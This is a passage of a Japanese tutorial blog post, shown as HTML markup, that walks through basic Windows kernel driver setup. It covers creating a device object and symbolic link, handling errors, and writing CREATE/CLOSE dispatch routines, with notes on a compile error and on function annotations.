&lt;h3 id=&quot;カーネル関数が使用する文字列&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E9%96%A2%E6%95%B0%E3%81%8C%E4%BD%BF%E7%94%A8%E3%81%99%E3%82%8B%E6%96%87%E5%AD%97%E5%88%97&quot; aria-label=&quot;カーネル関数が使用する文字列 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;カーネル関数が使用する文字列&lt;/h3&gt;
&lt;p&gt;カーネル関数で文字列を使用する場合、基本的には&lt;code class=&quot;language-text&quot;&gt;UNICODE_STRING&lt;/code&gt;型の構造体が期待されます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-_unicode_string&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;&lt;em&gt;UNICODE&lt;/em&gt;STRING (ntdef.h) - Win32 apps | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ソースコードの以下の行では、&lt;code class=&quot;language-text&quot;&gt;RTL_CONSTANT_STRING&lt;/code&gt;マクロを使ってパスの文字列&lt;code class=&quot;language-text&quot;&gt;\\Device\\SecondDriver&lt;/code&gt;を&lt;code class=&quot;language-text&quot;&gt;UNICODE_STRING&lt;/code&gt;に変換して変数&lt;code class=&quot;language-text&quot;&gt;devname&lt;/code&gt;に格納しています。&lt;/p&gt;
&lt;p&gt;そのあとに出てくる&lt;code class=&quot;language-text&quot;&gt;symLink&lt;/code&gt;の行も同様です。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;UNICODE_STRING devName &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;RTL_CONSTANT_STRING&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;L&lt;span class=&quot;token string&quot;&gt;&quot;\\Device\\SecondDriver&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

UNICODE_STRING symLink &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;RTL_CONSTANT_STRING&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;L&lt;span class=&quot;token string&quot;&gt;&quot;\\??\\SecondDriver&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlinitstring&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;RtlInitString function (wdm.h) - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;デバイスオブジェクトの作成&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%87%E3%83%90%E3%82%A4%E3%82%B9%E3%82%AA%E3%83%96%E3%82%B8%E3%82%A7%E3%82%AF%E3%83%88%E3%81%AE%E4%BD%9C%E6%88%90&quot; aria-label=&quot;デバイスオブジェクトの作成 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;デバイスオブジェクトの作成&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;DriverEntry&lt;/code&gt;関数内で行う必要がある「デバイスオブジェクトの生成」はここで行います。&lt;/p&gt;
&lt;p&gt;もともと&lt;code class=&quot;language-text&quot;&gt;DriverEntry&lt;/code&gt;関数の引数としてカーネルが初期化した&lt;code class=&quot;language-text&quot;&gt;DriverObject&lt;/code&gt;を受け取ってはいますが、これは&lt;code class=&quot;language-text&quot;&gt;IoCreateDevice&lt;/code&gt;関数でデバイスオブジェクトを作成するために必要な情報になります。&lt;/p&gt;
&lt;p&gt;デバイスオブジェクトが存在しない場合、ハンドルをオープンしてユーザモードのクライアントがドライバと通信する方法がない状態となります。&lt;/p&gt;
&lt;p&gt;デバイスオブジェクトは&lt;code class=&quot;language-text&quot;&gt;IoCreateDevice&lt;/code&gt;関数で作成します。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;IoCreateDevice&lt;/code&gt;関数は以下の構造です。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;NTSTATUS &lt;span class=&quot;token function&quot;&gt;IoCreateDevice&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;in&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;           PDRIVER_OBJECT  DriverObject&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;in&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;           ULONG           DeviceExtensionSize&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;in&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; optional&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; PUNICODE_STRING DeviceName&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;in&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;           DEVICE_TYPE     DeviceType&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;in&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;           ULONG           DeviceCharacteristics&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;in&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;           BOOLEAN         Exclusive&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;out&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;          PDEVICE_OBJECT  &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;DeviceObject
&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iocreatedevice&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;IoCreateDevice function (wdm.h) - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;第1引数として受け取る&lt;code class=&quot;language-text&quot;&gt;PDRIVER_OBJECT&lt;/code&gt;型の&lt;code class=&quot;language-text&quot;&gt;DriverObject&lt;/code&gt;は呼び出し元のデバイスオブジェクトになります。&lt;/p&gt;
&lt;p&gt;これは&lt;code class=&quot;language-text&quot;&gt;DriverEntry&lt;/code&gt;関数の引数として受け取っていたものです。&lt;/p&gt;
&lt;p&gt;第7引数には、新しく作成する&lt;code class=&quot;language-text&quot;&gt;DeviceObject&lt;/code&gt;構造体のポインタが与えられます。&lt;/p&gt;
&lt;p&gt;新たに宣言した&lt;code class=&quot;language-text&quot;&gt;PDEVICE_OBJECT&lt;/code&gt;型の&lt;code class=&quot;language-text&quot;&gt;DeviceObject&lt;/code&gt;のポインタを引数として与えられます。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;IoCreateDevice&lt;/code&gt;関数が正常に動作した場合、このポインタの参照先に非ページプールから割り当てられたデバイスオブジェクトが格納されます。&lt;/p&gt;
&lt;p&gt;また、第3引数の&lt;code class=&quot;language-text&quot;&gt;DeviceName&lt;/code&gt;では、作成するデバイスオブジェクトに名前を付けることができます。&lt;/p&gt;
&lt;p&gt;ここでは、先ほど定義した&lt;code class=&quot;language-text&quot;&gt;devname&lt;/code&gt;を設定しています。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;DeviceType&lt;/code&gt;には&lt;code class=&quot;language-text&quot;&gt;FILE_DEVICE_UNKNOWN&lt;/code&gt;を指定します。&lt;/p&gt;
&lt;p&gt;その他設定可能なデバイスタイプについては以下のドキュメントにまとまってます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/specifying-device-types&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Specifying Device Types - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;実際のコードは以下のようになります。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;PDEVICE_OBJECT DeviceObject&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
NTSTATUS status &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;IoCreateDevice&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;DriverObject&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;devName&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; FILE_DEVICE_UNKNOWN&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; FALSE&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;DeviceObject&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;NT_SUCCESS&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;status&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;token function&quot;&gt;KdPrint&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Failed to create device (0x%08X)\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; status&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; status&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;処理に失敗した場合は、&lt;code class=&quot;language-text&quot;&gt;KdPrint&lt;/code&gt;関数でエラーメッセージを出力します。&lt;/p&gt;
&lt;h3 id=&quot;シンボリックリンクの作成&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%B7%E3%83%B3%E3%83%9C%E3%83%AA%E3%83%83%E3%82%AF%E3%83%AA%E3%83%B3%E3%82%AF%E3%81%AE%E4%BD%9C%E6%88%90&quot; aria-label=&quot;シンボリックリンクの作成 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;シンボリックリンクの作成&lt;/h3&gt;
&lt;p&gt;デバイスオブジェクトを作成しましたが、このままではユーザモードのクライアントからはアクセスすることができません。&lt;/p&gt;
&lt;p&gt;ユーザモードのクライアントからデバイスドライバにアクセスするためには、デバイスオブジェクトのシンボリックリンクの作成が必要になります。&lt;/p&gt;
&lt;p&gt;シンボリックリンクの作成は&lt;code class=&quot;language-text&quot;&gt;IoCreateSymbolicLink&lt;/code&gt;関数で行います。&lt;/p&gt;
&lt;p&gt;関数自体はシンプルで、&lt;code class=&quot;language-text&quot;&gt;PUNICODE_STRING&lt;/code&gt;構造体に変換したシンボリックリンクとデバイスオブジェクトの名前を引数に与えるだけです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iocreatesymboliclink&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;IoCreateSymbolicLink function (wdm.h) - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;実際のコードは以下のようになります。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;UNICODE_STRING symLink &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;RTL_CONSTANT_STRING&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;L&lt;span class=&quot;token string&quot;&gt;&quot;\\??\\SecondDriver&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
status &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;IoCreateSymbolicLink&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;symLink&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;devName&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;NT_SUCCESS&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;status&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;token function&quot;&gt;KdPrint&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Failed to create symbolic link (0x%08X)\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; status&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;token function&quot;&gt;IoDeleteDevice&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;DeviceObject&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; status&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;シンボリックリンクの作成に失敗した場合、すべての作業を取り消して終了する必要があります。&lt;/p&gt;
&lt;p&gt;ここでは、&lt;code class=&quot;language-text&quot;&gt;IoDeleteDevice&lt;/code&gt;関数を用いてシステムからデバイスオブジェクトを削除しています。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iodeletedevice&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;IoDeleteDevice function (wdm.h) - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;デバイスオブジェクトとシンボリックリンクの作成が完了したら&lt;code class=&quot;language-text&quot;&gt;DriverEntry&lt;/code&gt;の処理は終了します。&lt;/p&gt;
&lt;h2 id=&quot;ディスパッチルーチンに割り当てるルーチンのセットアップ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%87%E3%82%A3%E3%82%B9%E3%83%91%E3%83%83%E3%83%81%E3%83%AB%E3%83%BC%E3%83%81%E3%83%B3%E3%81%AB%E5%89%B2%E3%82%8A%E5%BD%93%E3%81%A6%E3%82%8B%E3%83%AB%E3%83%BC%E3%83%81%E3%83%B3%E3%81%AE%E3%82%BB%E3%83%83%E3%83%88%E3%82%A2%E3%83%83%E3%83%97&quot; aria-label=&quot;ディスパッチルーチンに割り当てるルーチンのセットアップ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ディスパッチルーチンに割り当てるルーチンのセットアップ&lt;/h2&gt;
&lt;p&gt;先ほど以下の行で設定したCREATEとCLOSEをサポートするルーチンをセットアップしていきます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;DriverObject&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;MajorFunction&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;IRP_MJ_CREATE&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; SecondDriverCreateClose&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
DriverObject&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;MajorFunction&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;IRP_MJ_CLOSE&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; SecondDriverCreateClose&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;4章で作成したプログラムでは、CREATEとCLOSEのルーチンが同じ&lt;code class=&quot;language-text&quot;&gt;SecondDriverCreateClose&lt;/code&gt;に設定されています。&lt;/p&gt;
&lt;p&gt;これは、特別な処理をせずに単にIRP要求を受け入れるだけの挙動だからです。&lt;/p&gt;
&lt;p&gt;CREATEとCLOSEで処理を分けたい場合は、ルーチンも異なるルーチンを作成して割り当てる必要があります。&lt;/p&gt;
&lt;p&gt;実際にコードを見てみます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;_Use_decl_annotations_
NTSTATUS &lt;span class=&quot;token function&quot;&gt;SecondDriverCreateClose&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;PDEVICE_OBJECT DeviceObject&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; PIRP Irp&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;token function&quot;&gt;UNREFERENCED_PARAMETER&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;DeviceObject&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

	Irp&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;IoStatus&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Status &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; STATUS_SUCCESS&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	Irp&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;IoStatus&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Information &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;token function&quot;&gt;IoCompleteRequest&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;Irp&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; IO_NO_INCREMENT&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; STATUS_SUCCESS&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;なお、実際に書籍のサンプルのようにディスパッチルーチンを定義すると、ビルド時にコンパイルエラーC2440が発生しました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;エラー	C2440	&lt;span class=&quot;token char&quot;&gt;&apos;=&apos;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &apos;&lt;span class=&quot;token function&quot;&gt;NTSTATUS&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;__stdcall &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;PDRIVER_OBJECT&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;PIRP&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token char&quot;&gt;&apos; から &apos;&lt;/span&gt;PDRIVER_DISPATCH&apos; に変換できません。&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ググっても正直よくわからなかったのですが、割り当てる関数をプロトタイプ宣言じゃなくて&lt;code class=&quot;language-text&quot;&gt;DriverEntry&lt;/code&gt;関数より前に直接定義してみたら解決しました。&lt;/p&gt;
&lt;p&gt;ほんとにこれでいいのかはわからん。&lt;/p&gt;
&lt;p&gt;そもそもWDMでカーネル開発すること自体が非推奨なので、最新のコンパイラだと何か引っかかっちゃうんですかね？&lt;/p&gt;
&lt;h3 id=&quot;関数アノテーション&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E9%96%A2%E6%95%B0%E3%82%A2%E3%83%8E%E3%83%86%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3&quot; aria-label=&quot;関数アノテーション permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;関数アノテーション&lt;/h3&gt;
&lt;p&gt;先頭行に&lt;code class=&quot;language-text&quot;&gt;_Use_decl_annotations_&lt;/code&gt;がありますが、用途が全く分かりませんでした。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;_Use_decl_annotations_&lt;/code&gt;を使用することで、同じ関数のスコープ内のヘッダに表示されるアノテーションが&lt;code class=&quot;language-text&quot;&gt;_Use_decl_annotations_&lt;/code&gt;を持つ定義にも存在するかのように使用される、とドキュメントに記載があります。&lt;/p&gt;
